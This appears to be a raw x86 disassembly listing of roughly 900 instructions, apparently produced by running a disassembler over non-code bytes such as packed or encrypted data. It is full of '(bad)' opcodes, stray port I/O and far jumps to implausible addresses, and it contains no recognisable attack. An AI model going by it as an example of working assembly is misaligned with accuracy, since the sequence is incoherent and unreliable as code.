  41ec65:	repz (bad) 
  41ec67:	out    dx,eax
  41ec68:	fmulp  st(3),st
  41ec6a:	in     al,dx
  41ec6b:	repz ret 
  41ec6d:	les    esi,FWORD PTR [ebx+ebx*8-0x17312614]
  41ec74:	retf   
  41ec75:	(bad)  
  41ec77:	aad    0xb9
  41ec79:	mov    eax,0x5e2d2f2
  41ec7e:	mov    ecx,0xcfffcaf6
  41ec83:	fiadd  DWORD PTR [edx]
  41ec85:	leave  
  41ec86:	loope  0x41ec73
  41ec88:	fbld   TBYTE PTR [esi-0x4b0b1140]
  41ec8e:	jmp    0xdaf3:0xefeeb5e0
  41ec95:	(bad)  
  41ec96:	int    0xf9
  41ec98:	ret    0xb9e1
  41ec9b:	push   es
  41ec9c:	in     eax,0xfc
  41ec9e:	(bad)  
  41ec9f:	(bad)
  41eca2:	fcmovu st,st(6)
  41eca4:	cld    
  41eca5:	inc    DWORD PTR [eax+eiz*8]
  41eca8:	rcr    ebp,1
  41ecaa:	mov    bh,0xb1
  41ecac:	mov    dh,0xac
  41ecae:	retf   
  41ecaf:	out    0xda,al
  41ecb1:	sar    esi,cl
  41ecb3:	fst    st(4)
  41ecb5:	jmp    0x41eca0
  41ecb7:	repz fcmovnu st,st(5)
  41ecba:	add    eax,edi
  41ecbc:	add    eax,DWORD PTR ds:0xd7e4c6c5
  41ecc2:	ffreep st(5)
  41ecc4:	pop    es
  41ecc5:	add    ecx,esi
  41ecc7:	pmulhuw mm4,mm2
  41ecca:	loopne 0x41ec98
  41eccc:	(bad)
  41eccf:	mov    edx,0xd0cfd4cc
  41ecd4:	out    dx,al
  41ecd5:	mov    edi,0xcceed9ca
  41ecda:	std    
  41ecdb:	hlt    
  41ecdc:	int    0xf0
  41ecde:	shl    bh,cl
  41ece0:	aam    0x4
  41ece2:	in     al,0xfe
  41ece4:	hlt    
  41ece5:	(bad)  
  41ece7:	fucomp st(0)
  41ece9:	(bad)
  41ecec:	out    0xca,al
  41ecee:	fcmovbe st,st(2)
  41ecf0:	fsub   st,st(4)
  41ecf2:	sar    ch,cl
  41ecf4:	repz test ah,0xe2
  41ecf8:	sti    
  41ecf9:	sar    DWORD PTR [esi+edi*8-0x27420429],1
  41ed00:	std    
  41ed01:	cld    
  41ed02:	lds    eax,FWORD PTR [edx]
  41ed04:	into   
  41ed05:	sti    
  41ed06:	leave  
  41ed07:	rcl    ecx,cl
  41ed09:	repz shl cl,0xf4
  41ed0d:	scas   al,BYTE PTR es:[edi]
  41ed0e:	into   
  41ed0f:	imul   BYTE PTR [edi-0xf0f5220]
  41ed15:	mov    ah,0xcb
  41ed17:	fxch   st(7)
  41ed19:	(bad)  
  41ed1a:	rol    BYTE PTR [ebx],1
  41ed1c:	ret    
  41ed1d:	rcl    edx,1
  41ed1f:	(bad)  
  41ed20:	leave  
  41ed21:	mov    BYTE PTR [ecx],0xe2
  41ed24:	add    DWORD PTR [edx],eax
  41ed26:	std    
  41ed27:	cli    
  41ed28:	(bad)  
  41ed29:	mov    bl,0xce
  41ed2b:	leave  
  41ed2c:	(bad)  
  41ed2d:	test   dl,0xe2
  41ed30:	retf   0xcff1
  41ed33:	aad    0xdb
  41ed35:	in     al,0xff
  41ed37:	aam    0xbc
  41ed39:	loop   0x41ed1e
  41ed3b:	out    dx,al
  41ed3c:	mov    esi,0xc3e6d6dd
  41ed41:	test   BYTE PTR [eax],0x9
  41ed44:	in     al,0xff
  41ed46:	push   es
  41ed47:	in     al,dx
  41ed48:	repz fsubr QWORD PTR [eax-0x2d4a1a18]
  41ed4f:	out    0xee,al
  41ed51:	(bad)  
  41ed52:	mov    dh,0xd7
  41ed54:	sti    
  41ed55:	cmc    
  41ed56:	into   
  41ed57:	fdiv   st(1),st
  41ed59:	aad    0xbe
  41ed5b:	test   esp,0xca0bd4e5
  41ed61:	(bad)  
  41ed62:	in     al,0xc8
  41ed64:	(bad)
  41ed67:	shl    BYTE PTR [edi-0x52290943],cl
  41ed6d:	loop   0x41ed3d
  41ed6f:	(bad)  
  41ed70:	ror    dh,1
  41ed72:	clc    
  41ed73:	lods   al,BYTE PTR ds:[esi]
  41ed74:	(bad)  
  41ed75:	shr    bh,cl
  41ed77:	add    eax,edx
  41ed79:	loop   0x41ed3e
  41ed7b:	out    0xe5,eax
  41ed7d:	(bad)  
  41ed7e:	rcr    dl,1
  41ed80:	leave  
  41ed81:	in     eax,0x0
  41ed83:	or     bl,ah
  41ed85:	fld    DWORD PTR [edi]
  41ed87:	shl    bh,0xcb
  41ed8a:	(bad)  
  41ed8b:	mov    cl,0xee
  41ed8d:	mov    ah,0xc1
  41ed8f:	sti    
  41ed90:	mov    ecx,0xe5b9feda
  41ed95:	sti    
  41ed96:	shl    ebx,1
  41ed98:	in     eax,dx
  41ed99:	call   0xf301c75e
  41ed9e:	or     bh,ah
  41eda0:	or     DWORD PTR [eax],eax
  41eda2:	loope  0x41ed9e
  41eda4:	in     al,0xe6
  41eda6:	paddsb mm1,mm2
  41eda9:	rcr    esp,1
  41edab:	icebp  
  41edac:	into   
  41edad:	int    0xf6
  41edaf:	cmc    
  41edb0:	jmp    0x41ed9e
  41edb2:	in     eax,dx
  41edb3:	out    dx,al
  41edb4:	(bad)  
  41edb6:	cld    
  41edb7:	fucomip st,st(4)
  41edb9:	repnz lock clc 
  41edbc:	(bad)  
  41edbd:	in     al,dx
  41edbe:	inc    bh
  41edc0:	sti    
  41edc1:	jmp    0xecec:0x500d9ff
  41edc8:	scas   eax,DWORD PTR es:[edi]
  41edc9:	rcl    ecx,1
  41edcb:	lods   al,BYTE PTR ds:[esi]
  41edcc:	div    al
  41edce:	ret    0xc0fb
  41edd1:	retf   0xeddf
  41edd4:	mov    ebx,0xfed6d2fe
  41edd9:	repz aam 0xf1
  41eddc:	(bad)  
  41eddd:	loop   0x41edd5
  41eddf:	ret    0xfbc7
  41ede2:	push   es
  41ede3:	in     eax,dx
  41ede4:	in     al,0xe7
  41ede6:	or     eax,0xa5aceeca
  41edeb:	retf   0xe6f1
  41edee:	repnz shl eax,cl
  41edf1:	(bad)
  41edf4:	in     eax,dx
  41edf5:	enter  0xeae8,0xf0
  41edf9:	pop    es
  41edfa:	aam    0xe1
  41edfc:	shl    bh,1
  41edfe:	hlt    
  41edff:	(bad)  
  41ee00:	stc    
  41ee01:	cli    
  41ee02:	les    eax,FWORD PTR [ebx]
  41ee04:	sti    
  41ee05:	fsubp  st(5),st
  41ee07:	enter  0xb0c0,0xf6
  41ee0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee0c:	jmp    0x41edd2
  41ee0e:	(bad)  
  41ee0f:	out    dx,eax
  41ee10:	mov    ah,0xc7
  41ee12:	repz out 0xbb,al
  41ee15:	fucomip st,st(3)
  41ee17:	leave  
  41ee18:	mov    bh,0xb6
  41ee1a:	rol    esi,cl
  41ee1c:	fld    st(4)
  41ee1e:	xlat   BYTE PTR ds:[ebx]
  41ee1f:	fcmovnu st,st(7)
  41ee21:	(bad)  
  41ee22:	in     al,0xc4
  41ee24:	aam    0xe9
  41ee26:	retf   
  41ee27:	(bad)  
  41ee28:	out    dx,eax
  41ee29:	ret    
  41ee2a:	(bad)  
  41ee2b:	in     al,0xae
  41ee2d:	xlat   BYTE PTR ds:[ebx]
  41ee2e:	lods   al,BYTE PTR ds:[esi]
  41ee2f:	in     al,dx
  41ee30:	in     eax,0xb7
  41ee32:	retf   
  41ee33:	leave  
  41ee34:	int3   
  41ee35:	mov    esp,0xfad6f6d5
  41ee3a:	(bad)  
  41ee3b:	loopne 0x41ee12
  41ee3d:	jmp    0x41ee1f
  41ee3f:	(bad)  
  41ee40:	retf   0xf9fc
  41ee43:	loop   0x41ee32
  41ee45:	call   0xb20ff543
  41ee4a:	in     eax,dx
  41ee4b:	mov    al,0xbd
  41ee4d:	in     al,dx
  41ee4e:	jmp    0x41ee32
  41ee50:	jmp    0xef10dc19
  41ee55:	int    0xf8
  41ee57:	add    edx,edx
  41ee59:	iret   
  41ee5a:	loop   0x41ee2a
  41ee5c:	ret    
  41ee5d:	shl    ah,cl
  41ee5f:	jmp    0x41ee55
  41ee61:	jmp    0xe80e:0xeec5eec9
  41ee68:	repnz ror edx,cl
  41ee6b:	scas   al,BYTE PTR es:[edi]
  41ee6c:	mov    esp,0xc4d7d2e7
  41ee71:	sti    
  41ee72:	int    0xb0
  41ee74:	mov    bh,0xf4
  41ee76:	sti    
  41ee77:	cmc    
  41ee78:	repz rcr eax,1
  41ee7b:	icebp  
  41ee7c:	add    al,BYTE PTR [ebx]
  41ee7e:	aam    0x3
  41ee80:	icebp  
  41ee81:	pop    es
  41ee82:	jmp    0x41ee92
  41ee84:	dec    BYTE PTR [esi]
  41ee86:	in     al,0xc0
  41ee88:	loopne 0x41ee50
  41ee8a:	enter  0xe7c3,0xdb
  41ee8e:	in     eax,dx
  41ee8f:	mov    ch,0xec
  41ee91:	ror    esp,1
  41ee93:	fnop   
  41ee95:	into   
  41ee96:	sar    DWORD PTR [ecx-0x33473e06],cl
  41ee9c:	test   DWORD PTR [ebx],0xe4df07bc
  41eea2:	add    ch,cl
  41eea4:	clc    
  41eea5:	add    ch,bh
  41eea7:	add    eax,0xb6c4dce3
  41eeac:	jecxz  0x41ee64
  41eeae:	xlat   BYTE PTR ds:[ebx]
  41eeaf:	cmc    
  41eeb0:	mov    bh,0xf3
  41eeb2:	int    0xd1
  41eeb4:	fdivr  st,st(6)
  41eeb6:	retf   
  41eeb7:	sti    
  41eeb8:	aam    0xe0
  41eeba:	mov    esi,0xbdddf6fa
  41eebf:	mov    DWORD PTR [edi],0xd9c8bde6
  41eec5:	add    ebx,edx
  41eec7:	adc    esi,ecx
  41eec9:	retf   
  41eeca:	mov    ebp,0xefeaefc5
  41eecf:	(bad)  
  41eed0:	into   
  41eed1:	jmp    0xf426a7b5
  41eed6:	mov    ebp,0xd2f7f4c2
  41eedb:	(bad)  
  41eedd:	cmc    
  41eede:	retf   
  41eedf:	mov    eax,0xcb02e6f6
  41eee4:	fcmove st,st(3)
  41eee6:	add    al,0xc0
  41eee8:	loope  0x41eed7
  41eeea:	ror    esp,0xcf
  41eeed:	shl    cl,1
  41eeef:	(bad)
  41eef2:	fidiv  WORD PTR [edi-0x1c14412f]
  41eef8:	sar    DWORD PTR [edx-0xff80a02],0xeb
  41eeff:	(bad)  
  41ef00:	fsubrp st(3),st
  41ef02:	or     eax,eax
  41ef04:	fucomi st,st(3)
  41ef06:	loope  0x41ef13
  41ef08:	rcl    dl,cl
  41ef0a:	repnz jecxz 0x41eef0
  41ef0d:	mov    dh,0xe7
  41ef0f:	in     al,0xcf
  41ef11:	ror    ebx,1
  41ef13:	stc    
  41ef14:	shl    ebx,cl
  41ef16:	cmc    
  41ef17:	(bad)  
  41ef18:	loopne 0x41eedd
  41ef1a:	div    eax
  41ef1c:	add    BYTE PTR [eax],al
  41ef1e:	(bad)  
  41ef1f:	cld    
  41ef20:	retf   0xee4
  41ef23:	push   es
  41ef24:	or     al,dl
  41ef26:	iret   
  41ef27:	fucomp st(3)
  41ef29:	enter  0xadbf,0xae
  41ef2d:	mov    dh,0xb4
  41ef2f:	out    0xe9,eax
  41ef31:	(bad)  
  41ef32:	fidiv  DWORD PTR [esi-0x13010118]
  41ef38:	cli    
  41ef39:	out    0xf9,eax
  41ef3b:	icebp  
  41ef3c:	(bad)  
  41ef3f:	pop    es
  41ef40:	shl    bh,0xf9
  41ef43:	mov    esp,0xdecdec3
  41ef48:	scas   al,BYTE PTR es:[edi]
  41ef49:	scas   eax,DWORD PTR es:[edi]
  41ef4a:	into   
  41ef4b:	into   
  41ef4c:	mov    bh,0xca
  41ef4e:	mov    dh,0xc1
  41ef50:	leave  
  41ef51:	mov    ah,0xe8
  41ef53:	(bad)  
  41ef54:	jmp    0xff2aeb44
  41ef59:	stc    
  41ef5a:	aam    0xe6
  41ef5c:	rcr    edx,cl
  41ef5e:	jmp    0xeeb:0xfad4e803
  41ef65:	repz adc eax,DWORD PTR ds:0xd3c1c9bf
  41ef6c:	out    dx,eax
  41ef6d:	cmc    
  41ef6e:	out    dx,al
  41ef6f:	loop   0x41ef21
  41ef71:	mov    al,0xf3
  41ef73:	jmp    0xb9c9:0xb8d0ddd0
  41ef7a:	fcom   st(7)
  41ef7c:	ret    0xe4e3
  41ef7f:	mov    eax,0xcff4f604
  41ef84:	or     eax,DWORD PTR ds:0xcfe7fee0
  41ef8a:	jmp    0xafbb:0xeedbc4af
  41ef91:	shr    cl,1
  41ef93:	shr    cl,1
  41ef95:	in     eax,dx
  41ef96:	enter  0xe1ff,0xe2
  41ef9a:	hlt    
  41ef9b:	loope  0x41ef9b
  41ef9d:	cli    
  41ef9e:	add    al,BYTE PTR [eax]
  41efa0:	jmp    0x41efab
  41efa2:	(bad)  
  41efa5:	cld    
  41efa6:	cld    
  41efa7:	or     edx,esp
  41efa9:	int3   
  41efaa:	jmp    0xd8ec:0xc6c1edca
  41efb1:	sar    ebx,cl
  41efb3:	aad    0xb6
  41efb5:	call   0xf222d2b2
  41efba:	fldlg2 
  41efbc:	aad    0xe2
  41efbe:	in     eax,0xd5
  41efc0:	add    al,0xe1
  41efc2:	hlt    
  41efc3:	(bad)  
  41efc4:	stc    
  41efc5:	add    BYTE PTR [edx],cl
  41efc7:	adc    bh,BYTE PTR [esi-0x11393617]
  41efcd:	ret    0xb6b5
  41efd0:	not    esp
  41efd2:	in     eax,0xcc
  41efd4:	(bad)  
  41efd6:	ret    
  41efd7:	(bad)  
  41efd8:	mov    edi,0xf0cef6b6
  41efdd:	(bad)
  41efe0:	add    eax,0xd406e9db
  41efe5:	fxch   st(0)
  41efe7:	icebp  
  41efe8:	(bad)  
  41efe9:	leave  
  41efea:	shl    eax,cl
  41efec:	retf   0xd4b0
  41efef:	jmp    0x41efe2
  41eff1:	mov    eax,0xe8f0dac6
  41eff6:	mov    cl,0xca
  41eff8:	jecxz  0x41eff6
  41effa:	clc    
  41effb:	add    edi,eax
  41effd:	out    0xbc,eax
  41efff:	lds    ecx,FWORD PTR [edx]
  41f001:	cld    
  41f002:	or     esi,ebp
  41f004:	jmp    0x41eff2
  41f006:	retf   0xe5c4
  41f009:	int    0xf7
  41f00b:	mov    ebp,0xe7d1d2e6
  41f010:	sti    
  41f011:	in     al,dx
  41f012:	aam    0xf3
  41f014:	int    0xfe
  41f016:	repnz mov eax,0xc0ddb6da
  41f01c:	shl    esi,1
  41f01e:	mov    ecx,0xcfcbdae6
  41f023:	aad    0xf5
  41f025:	in     al,0xdb
  41f027:	loop   0x41effb
  41f029:	stos   BYTE PTR es:[edi],al
  41f02a:	mov    bl,0xce
  41f02c:	shl    ch,cl
  41f02e:	into   
  41f02f:	in     eax,dx
  41f030:	lock repnz hlt 
  41f033:	(bad)  
  41f034:	jmp    0x41f029
  41f036:	call   0xf616e223
  41f03b:	cli    
  41f03c:	out    0xbc,al
  41f03e:	mov    ecx,0xbd08d509
  41f043:	call   0xcc1bb854
  41f048:	mov    bl,0xbd
  41f04a:	test   al,0xb1
  41f04c:	lock out 0xf3,eax
  41f04f:	loopne 0x41f045
  41f051:	mov    dh,0xc6
  41f053:	mov    bh,0xdf
  41f055:	fidiv  DWORD PTR [ecx-0x2a490a2d]
  41f05b:	loope  0x41f049
  41f05d:	ret    
  41f05e:	lock clc 
  41f060:	add    eax,DWORD PTR [ecx]
  41f062:	jmp    0x41f06e
  41f064:	add    al,0xc6
  41f066:	cli    
  41f067:	(bad)  
  41f068:	lods   al,BYTE PTR ds:[esi]
  41f069:	jmp    0xe4f3e730
  41f06e:	in     al,dx
  41f06f:	ror    ah,0xc9
  41f072:	repnz lock mov ebp,0xf0d3b8
  41f079:	out    0x0,eax
  41f07b:	add    edx,esi
  41f07d:	lock idiv bh
  41f080:	not    al
  41f082:	cli    
  41f083:	(bad)  [eax]
  41f085:	add    ebx,ecx
  41f087:	in     eax,dx
  41f088:	les    esi,FWORD PTR [ecx-0x48232239]
  41f08e:	cli    
  41f08f:	xlat   BYTE PTR ds:[ebx]
  41f090:	jmp    0x41f087
  41f092:	(bad)  
  41f094:	aad    0xda
  41f096:	lock shl ch,1
  41f099:	(bad)  
  41f09b:	loope  0x41f08d
  41f09d:	loop   0x41f070
  41f09f:	ret    
  41f0a0:	shl    bh,0xdc
  41f0a3:	in     eax,0x9
  41f0a5:	or     eax,0xcff30d09
  41f0aa:	mov    esp,0xfbf7c5e0
  41f0af:	rcl    esi,1
  41f0b1:	retf   0xcfd7
  41f0b4:	shl    al,cl
  41f0b6:	stc    
  41f0b7:	mov    ecx,0xe2f4eeed
  41f0bc:	add    al,0xd7
  41f0be:	in     eax,0x3
  41f0c0:	sti    
  41f0c1:	fst    st(4)
  41f0c3:	iret   
  41f0c4:	fmul   DWORD PTR ds:0xd7f1efea
  41f0ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0cb:	in     eax,0xe0
  41f0cd:	(bad)  
  41f0ce:	loopne 0x41f09c
  41f0d0:	call   0xf31bb7c1
  41f0d5:	fdivr  st,st(5)
  41f0d7:	retf   0xf2ef
  41f0da:	out    0xdb,al
  41f0dc:	rcr    edx,1
  41f0de:	shl    bh,1
  41f0e0:	fcmove st,st(2)
  41f0e2:	jmp    0x41f0ec
  41f0e4:	sti    
  41f0e5:	(bad)  
  41f0e7:	retf   0xefcb
  41f0ea:	in     eax,dx
  41f0eb:	(bad)  
  41f0ed:	shr    dh,1
  41f0ef:	repnz enter 0xd6e6,0xd8
  41f0f4:	mov    bl,0xee
  41f0f6:	retf   0xe0d6
  41f0f9:	std    
  41f0fa:	push   es
  41f0fb:	rcr    dh,1
  41f0fd:	repz sti 
  41f0ff:	fucom  st(3)
  41f101:	leave  
  41f102:	(bad)  
  41f104:	or     bl,ah
  41f106:	or     al,0xe0
  41f108:	mov    cl,0xbc
  41f10a:	vpaddusw ymm0,ymm6,ymm2
  41f10e:	cli    
  41f10f:	fyl2xp1 
  41f111:	enter  0xe9f0,0xb4
  41f115:	sar    bh,1
  41f117:	shl    bl,1
  41f119:	mov    eax,0xccecf803
  41f11e:	fadd   st(6),st
  41f120:	jmp    0x41f101
  41f122:	or     eax,esi
  41f124:	les    ecx,FWORD PTR [eax]
  41f126:	fist   WORD PTR [ecx]
  41f128:	scas   al,BYTE PTR es:[edi]
  41f129:	xlat   BYTE PTR ds:[ebx]
  41f12a:	loope  0x41f11e
  41f12c:	mov    bh,0xd6
  41f12e:	mov    dl,0xf0
  41f130:	test   bh,0xd4
  41f133:	mov    bh,0xe5
  41f135:	retf   
  41f136:	(bad)  
  41f138:	fdiv   QWORD PTR [esi-0x21332a05]
  41f13e:	aam    0xf0
  41f140:	cli    
  41f141:	ret    0xfcd9
  41f144:	iret   
  41f145:	out    dx,eax
  41f146:	add    bh,al
  41f148:	fistp  QWORD PTR [edi-0x2d514c21]
  41f14e:	(bad)  
  41f14f:	mov    ch,0xf9
  41f151:	call   0xc901cd4e
  41f156:	(bad)  
  41f158:	loop   0x41f159
  41f15a:	mov    ebp,0x4d3e5f9
  41f15f:	sar    cl,1
  41f161:	cli    
  41f162:	clc    
  41f163:	out    dx,al
  41f164:	fmul   st(1),st
  41f166:	fsub   st,st(1)
  41f168:	lods   eax,DWORD PTR ds:[esi]
  41f169:	out    0xf6,al
  41f16b:	retf   
  41f16c:	shr    ah,cl
  41f16e:	shl    esp,0xf5
  41f171:	rol    ah,1
  41f173:	aad    0xf9
  41f175:	shl    ah,1
  41f177:	enter  0xc3ef,0xee
  41f17b:	out    dx,al
  41f17c:	int    0xc1
  41f17e:	out    0xd4,eax
  41f180:	jmp    0x41f142
  41f182:	(bad)  
  41f183:	aam    0xde
  41f185:	into   
  41f186:	retf   
  41f187:	icebp  
  41f188:	fidiv  WORD PTR [ecx-0x36322f30]
  41f18e:	shl    DWORD PTR [ebx-0x33463847],0xdc
  41f195:	in     al,dx
  41f196:	repnz (bad) 
  41f199:	mov    eax,0xd9d3f9b5
  41f19e:	shr    ebx,1
  41f1a0:	fld1   
  41f1a2:	faddp  st(4),st
  41f1a4:	fcmovne st,st(4)
  41f1a6:	stc    
  41f1a7:	shr    BYTE PTR [ecx-0x3d331a3d],0xca
  41f1ae:	(bad)  
  41f1af:	retf   0xc6d3
  41f1b2:	jmp    0x440e47b
  41f1b7:	std    
  41f1b8:	shl    dh,cl
  41f1ba:	add    bh,dh
  41f1bc:	push   es
  41f1bd:	shl    esp,1
  41f1bf:	xlat   BYTE PTR ds:[ebx]
  41f1c0:	shl    eax,0xa
  41f1c3:	rol    BYTE PTR [edx],0xec
  41f1c6:	or     al,ah
  41f1c8:	out    dx,al
  41f1c9:	loop   0x41f1b8
  41f1cb:	enter  0xb4b2,0xf6
  41f1cf:	stc    
  41f1d0:	stc    
  41f1d1:	xbegin 0xbb1fab96
  41f1d7:	fcom   st(2)
  41f1d9:	rol    cl,1
  41f1db:	fidivr DWORD PTR [ebx+0xac3dbeb]
  41f1e1:	rol    dh,1
  41f1e3:	dec    DWORD PTR ds:0xe50be6df
  41f1e9:	(bad)  
  41f1ea:	imul   bl
  41f1ec:	ret    
  41f1ed:	mov    esp,0xc6e0d1b1
  41f1f2:	mov    cl,0xc4
  41f1f4:	(bad)  
  41f1f5:	idiv   ch
  41f1f7:	jmp    0xfefaabd0
  41f1fc:	jecxz  0x41f1fe
  41f1fe:	ret    
  41f1ff:	(bad)  
  41f201:	add    al,0x7
  41f203:	jmp    0x120af1e6
  41f208:	(bad)  
  41f20a:	mov    esi,0xb5e4b5e8
  41f20f:	aam    0xda
  41f211:	aad    0xf5
  41f213:	mov    edi,0xc3e2fbb9
  41f218:	(bad)  
  41f219:	rol    al,1
  41f21b:	mov    DWORD PTR ds:0xc0f6d4fb,0xe0fce0e9
  41f225:	(bad)  
  41f226:	out    dx,eax
  41f227:	in     eax,dx
  41f228:	lock int 0xe3
  41f22b:	loopne 0x41f1dc
  41f22d:	(bad)  
  41f22f:	(bad)  
  41f230:	fucomi st,st(3)
  41f232:	mov    ebx,0xefb2eafa
  41f237:	retf   0xfbd8
  41f23a:	hlt    
  41f23b:	ret    
  41f23c:	add    ebp,esi
  41f23e:	(bad)  
  41f240:	cli    
  41f241:	fprem1 
  41f243:	rcl    ah,0xd9
  41f246:	loop   0x41f24c
  41f248:	int    0xe3
  41f24a:	(bad)  
  41f24b:	mov    cl,0xf5
  41f24d:	shl    DWORD PTR [eax-0x30130d4d],0xef
  41f254:	mov    ch,0xd2
  41f256:	mov    ebp,0xcfdeb8f9
  41f25b:	(bad)  
  41f25c:	add    edi,esi
  41f25e:	add    al,0xeb
  41f260:	(bad)  
  41f261:	in     al,0xee
  41f263:	fdivrp st(5),st
  41f265:	in     eax,dx
  41f266:	int3   
  41f267:	out    dx,al
  41f268:	in     eax,0xce
  41f26a:	(bad)  
  41f26b:	into   
  41f26c:	mov    al,0xf7
  41f26e:	retf   0xf7cb
  41f271:	mov    ecx,0xf7d8fbd9
  41f276:	fsub   st(2),st
  41f278:	mov    ebp,0xd9f3e1d4
  41f27d:	(bad)  
  41f27e:	jmp    0xec0a:0xe01ddf2
  41f285:	fsub   st(6),st
  41f287:	add    eax,eax
  41f289:	mov    al,0xc3
  41f28b:	into   
  41f28c:	retf   0xe3b2
  41f28f:	repnz mov ch,0xc7
  41f292:	xlat   BYTE PTR ds:[ebx]
  41f293:	cli    
  41f294:	aad    0xfc
  41f296:	retf   
  41f297:	mov    eax,0xf9f8d2be
  41f29c:	(bad)  
  41f29e:	mov    ecx,0xe4cbe1fe
  41f2a3:	(bad)  
  41f2a4:	or     esp,eax
  41f2a6:	lds    ecx,FWORD PTR [ecx]
  41f2a8:	fild   QWORD PTR [ecx-0x1e2d1a09]
  41f2ae:	aad    0xb7
  41f2b0:	loope  0x41f297
  41f2b2:	retf   0xf7b7
  41f2b5:	mov    ah,0xf6
  41f2b7:	rol    ecx,cl
  41f2b9:	hlt    
  41f2ba:	std    
  41f2bb:	push   es
  41f2bc:	in     eax,dx
  41f2bd:	add    eax,0x4d0e3d9
  41f2c2:	retf   
  41f2c3:	mul    bh
  41f2c5:	fadd   QWORD PTR [esi+eax*1]
  41f2c8:	shl    dh,1
  41f2ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2cb:	retf   0xe2cf
  41f2ce:	shl    eax,cl
  41f2d0:	xlat   BYTE PTR ds:[ebx]
  41f2d1:	mov    al,0xc6
  41f2d3:	clc    
  41f2d4:	mov    eax,0xd5faf6d6
  41f2d9:	sar    esp,1
  41f2db:	add    bl,ah
  41f2dd:	sti    
  41f2de:	out    0xdd,eax
  41f2e0:	loopne 0x41f2bc
  41f2e2:	call   0x328e1ce
  41f2e7:	out    0xe6,al
  41f2e9:	out    0xa5,eax
  41f2eb:	lock xlat BYTE PTR ds:[ebx]
  41f2ed:	loopne 0x41f2a5
  41f2ef:	repnz vpsrlw xmm2,xmm2,xmm0
  41f2f4:	icebp  
  41f2f5:	call   edx
  41f2f7:	retf   0x1f4
  41f2fa:	bnd jmp ebx
  41f2fd:	rcl    bh,1
  41f2ff:	loopne 0x41f2eb
  41f301:	jmp    0x41f2ee
  41f303:	aad    0xc8
  41f305:	les    ecx,FWORD PTR [esi]
  41f307:	add    al,0xbf
  41f309:	stos   BYTE PTR es:[edi],al
  41f30a:	(bad)  
  41f30b:	rcl    ebp,cl
  41f30d:	(bad)  
  41f30e:	sti    
  41f30f:	out    0xb3,eax
  41f311:	out    dx,al
  41f312:	fidiv  WORD PTR [ebp-0x101d080a]
  41f318:	int3   
  41f319:	sti    
  41f31a:	fiadd  DWORD PTR ds:0xd9ffebf7
  41f320:	loop   0x41f304
  41f322:	hlt    
  41f323:	sti    
  41f324:	aad    0xf
  41f326:	retf   
  41f327:	call   0xeb06bd10
  41f32c:	lods   eax,DWORD PTR ds:[esi]
  41f32d:	loop   0x41f302
  41f32f:	jmp    0x41f302
  41f331:	lock into 
  41f333:	fdiv   DWORD PTR [edi+edx*8-0x520061d]
  41f33a:	(bad)  
  41f33c:	cmc    
  41f33d:	loopne 0x41f34a
  41f33f:	cmc    
  41f340:	loopne 0x41f340
  41f342:	leave  
  41f343:	paddusw mm3,mm6
  41f346:	jmp    0xe3f5e233
  41f34b:	leave  
  41f34c:	out    dx,al
  41f34d:	lds    esi,FWORD PTR [eax-0x1b13441c]
  41f353:	fidiv  WORD PTR [eax+ecx*8-0x491e2b42]
  41f35a:	fsubrp st(2),st
  41f35c:	rol    bh,1
  41f35e:	rol    DWORD PTR [ecx],0xc4
  41f361:	ret    0xfcd4
  41f364:	stc    
  41f365:	add    al,0xce
  41f367:	jecxz  0x41f35c
  41f369:	(bad)
  41f36c:	rcl    ecx,cl
  41f36e:	out    0xf0,eax
  41f370:	in     eax,0xb1
  41f372:	aad    0xed
  41f374:	out    dx,al
  41f375:	mov    ch,0xf8
  41f377:	repz loopne 0x41f379
  41f37a:	aam    0xe0
  41f37c:	in     eax,dx
  41f37d:	(bad)  
  41f37e:	cld    
  41f37f:	loopne 0x41f389
  41f381:	call   0xec1df181
  41f386:	add    dl,dh
  41f388:	lods   al,BYTE PTR ds:[esi]
  41f389:	in     eax,0xdf
  41f38b:	enter  0xacbd,0xce
  41f38f:	aam    0xb1
  41f391:	in     eax,dx
  41f392:	in     eax,0xd2
  41f394:	leave  
  41f395:	retf   0xf2ff
  41f398:	(bad)  
  41f399:	in     eax,dx
  41f39a:	fnstcw WORD PTR [eax-0x3e383a43]
  41f3a0:	cmc    
  41f3a1:	hlt    
  41f3a2:	retf   0xefb
  41f3a5:	loopne 0x41f368
  41f3a7:	in     eax,dx
  41f3a8:	ret    0xebee
  41f3ab:	test   al,0xc6
  41f3ad:	iret   
  41f3ae:	sar    ebx,cl
  41f3b0:	rol    esp,0xeb
  41f3b3:	enter  0xcfc9,0xd0
  41f3b7:	enter  0xd4d0,0xc7
  41f3bb:	(bad)  
  41f3bd:	aam    0xc5
  41f3bf:	add    ebp,edx
  41f3c1:	loop   0x41f3ac
  41f3c3:	fisttp DWORD PTR ds:0xdcedc100
  41f3c9:	mov    eax,0xaee2e2ae
  41f3ce:	lock icebp 
  41f3d0:	loope  0x41f3c5
  41f3d2:	xlat   BYTE PTR ds:[ebx]
  41f3d3:	call   0xbd21cecd
  41f3d8:	aad    0xfb
  41f3da:	xlat   BYTE PTR ds:[ebx]
  41f3db:	add    eax,edi
  41f3dd:	or     eax,ebx
  41f3df:	clc    
  41f3e0:	ffreep st(6)
  41f3e2:	add    ecx,ebx
  41f3e4:	aam    0xe1
  41f3e6:	std    
  41f3e7:	adc    ch,BYTE PTR [eax-0x34421e3b]
  41f3ed:	ror    ch,0xcd
  41f3f0:	mov    bl,0xb0
  41f3f2:	bnd jmp ebp
  41f3f5:	(bad)  
  41f3f7:	in     eax,dx
  41f3f8:	shl    ecx,0x1
  41f3fb:	fucomip st,st(5)
  41f3fd:	add    bl,dl
  41f3ff:	mov    eax,0xdf02dee2
  41f404:	add    al,0x0
  41f406:	std    
  41f407:	adc    ah,BYTE PTR [edi-0x15302f09]
  41f40d:	scas   al,BYTE PTR es:[edi]
  41f40e:	rcl    bl,1
  41f410:	(bad)  
  41f411:	leave  
  41f412:	mov    edi,0xd1d0bddb
  41f417:	iret   
  41f418:	stc    
  41f419:	(bad)  
  41f41a:	fstp   st(2)
  41f41c:	mov    ebx,0xf802fb07
  41f421:	ret    0xfc09
  41f424:	or     cl,BYTE PTR ds:0xe8eddf13
  41f42a:	fucomip st,st(0)
  41f42c:	(bad)  
  41f42d:	div    dl
  41f42f:	call   0xcb30ab2e
  41f434:	fmul   st(1),st
  41f436:	(bad)  
  41f437:	(bad)  
  41f438:	cld    
  41f439:	add    bh,al
  41f43b:	cld    
